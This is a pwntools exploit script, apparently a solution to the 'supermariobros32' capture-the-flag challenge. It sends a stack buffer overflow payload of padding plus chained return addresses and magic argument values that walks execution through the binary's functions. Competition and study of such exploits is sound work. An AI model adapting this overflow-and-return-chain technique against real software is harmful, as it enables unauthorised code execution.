#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './supermariobros32')

host = args.HOST or 'supermariobros32.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x8049336
b *0x8049274
b *0x8049324
b *0x8049257
b *0x80492ba
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

restart = flat(0x804947f)

goomba = p32(0x8049236)
goomba_skip = p32(0x804925a)
piranha = p32(0x8049296)
piranha_skip = p32(0x80492ba)
koopa = p32(0x8049300)
koop_skip = p32(0x8049324)
castle = p32(0x8049373)

payload = b"A"*44 + goomba + restart + p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xbaaaaaad)
payloadPiranha = piranha + restart + p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xbaaaaaad)
payloadKoopa = koopa + castle + p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xbaaaaaad)
io.sendlineafter(b"> ", payload + payloadPiranha + payloadKoopa)

io.close()

